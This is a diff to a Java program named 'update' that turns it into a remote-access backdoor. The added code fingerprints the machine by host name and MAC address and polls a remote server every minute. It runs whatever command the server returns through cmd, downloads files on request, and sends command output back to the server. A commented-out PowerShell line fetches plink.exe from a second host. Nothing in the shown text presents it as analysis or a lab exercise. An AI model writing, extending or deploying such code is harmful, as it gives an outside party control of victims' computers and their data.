@@ -6,24 +6,75 @@ import java.io.InputStreamReader;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 public class update{
 
 	public static void main(String[] args) {
 		// TODO Auto-generated method stub
-		try {
+		String hostname="none";
+		String result="";
+		String output="";
+		InetAddress addr;
+		Runtime runtime = Runtime.getRuntime();
+		try
+		{
+			addr = InetAddress.getLocalHost();
+		    hostname = addr.getHostName();
+		    hostname=hostname+"_"+GetNetworkAddress.GetAddress("mac");
+		    
+		}
+		catch (UnknownHostException ex)
+		{
+		    System.out.println("Hostname can not be resolved");
+		}
+/*		try {
+			
 			Runtime runtime = Runtime.getRuntime();
 	        String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://pannello.xoom.it/svc/plink.dat' -OutFile 'd:\\dati\\plink.exe'";
 	        Process proc = runtime.exec(cmds);
 		}
 		catch (IOException e) {
 		}
-		//try {
+*/		//try {
 	        while (true) {
-	        	String result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc=pippo");
+	        	result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname);
 	        	String[] array = result.split("\\|\\|", -1);
-	        	//Runtime runtime = Runtime.getRuntime();
-		        //String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://paner.altervista.org/svc/wup.php?pc=peppino' -OutFile 'd:\\dati\\log.txt'";
-		        //Process proc = runtime.exec(cmds);
+	        	String exec=array[6].substring(5);
+	        	String cmd=array[7].substring(4);
+	        	String iout=array[5].substring(5);
+	        	if (exec.equals("1"))
+	        	{
+	        		String cmds = "cmd /C "+cmd;
+	        		
+	        		
+	        		    array = cmd.split(" ", -1);
+	        		    if (array[0].equals("getfile"))
+	        		    {
+	        		    	DownloadFile.GetFile(array[1], array[2]);
+	        		    }
+	        		    else if (iout.equals("1"))
+	    	        	{
+	        				output = executeCommand(cmds);
+	        				output = output.replace("\'", "");
+		        			output = output.replace("\\", "\\\\");
+		        			output = output.replaceAll("(\r\n|\n)", "<br>");
+		        			output = output.replaceAll(" ", "%20");
+	        				result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname+"&dump="+output);
+	    	        	}
+	        			else
+	        			{
+	        				try{
+	        					Process proc = runtime.exec(cmds);
+	        				}
+		        			catch (IOException e) {
+		        			}	
+	        			}
+	        			result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname+"&exec=0");
+	        		
+	        	}	
 		        try {
 		        	Thread.sleep(60 * 1000);
 		        }
@@ -34,6 +85,29 @@ public class update{
 		//}
 	    //catch (IOException e) {
 		//}
+	}
+	private static String executeCommand(String command) {
+
+		StringBuffer output = new StringBuffer();
+
+		Process p;
+		try {
+			p = Runtime.getRuntime().exec(command);
+			p.waitFor();
+			BufferedReader reader = 
+                            new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+                        String line = "";			
+			while ((line = reader.readLine())!= null) {
+				output.append(line + "\n");
+			}
+
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+
+		return output.toString();
+
 	}
 	public static String getResponseFromUrl(String surl) {
 		String webPage = surl;
